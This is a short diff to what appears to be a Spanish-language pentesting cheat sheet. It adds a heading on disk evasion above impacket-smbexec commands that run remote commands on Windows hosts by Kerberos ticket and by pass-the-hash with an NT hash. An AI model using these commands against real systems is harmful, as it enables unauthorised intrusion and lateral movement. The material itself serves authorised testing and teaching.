@@ -35,6 +35,8 @@ impacket-smbexec -k -no-pass dominio.local/usuario_admin@NOMBRE_HOST_FQDN
 
 </br>
 
+## Evasión Avanzada de Disco
+
 ```
 impacket-smbexec -hashes :HASH_NT dominio.local/usuario_admin@IP_OBJETIVO -mode SERVER
 ```
